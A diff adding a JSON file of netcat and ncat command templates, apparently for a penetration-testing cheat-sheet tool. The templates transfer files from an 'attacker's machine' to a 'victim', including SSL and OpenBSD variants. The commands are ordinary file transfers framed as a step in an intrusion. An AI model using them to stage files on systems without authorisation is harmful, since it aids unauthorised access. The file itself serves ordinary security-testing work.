@@ -1,0 +1,34 @@
+{
+  "commands": [
+    {
+      "title": "Send file using Netcat (nc)",
+      "description": "Serve a file from the attacker's machine using netcat",
+      "template": "nc -lnvp {port} < {filename}"
+    },
+    {
+      "title": "Receive file using Netcat (nc)",
+      "description": "Download a file from the attacker using netcat on the victim",
+      "template": "nc {localip} {port} > {filename}"
+    },
+    {
+      "title": "Send file using Ncat (with SSL)",
+      "description": "Serve a file securely with Ncat using SSL",
+      "template": "ncat --ssl -lvnp {port} < {filename}"
+    },
+    {
+      "title": "Receive file using Ncat (with SSL)",
+      "description": "Download a file securely using Ncat with SSL",
+      "template": "ncat --ssl {localip} {port} > {filename}"
+    },
+    {
+      "title": "Send file using Netcat (OpenBSD variant)",
+      "description": "OpenBSD netcat to send file (requires -N to close connection)",
+      "template": "nc -N -lvnp {port} < {filename}"
+    },
+    {
+      "title": "Receive file using Netcat (OpenBSD variant)",
+      "description": "OpenBSD netcat to receive file",
+      "template": "nc -N {localip} {port} > {filename}"
+    }
+  ]
+}
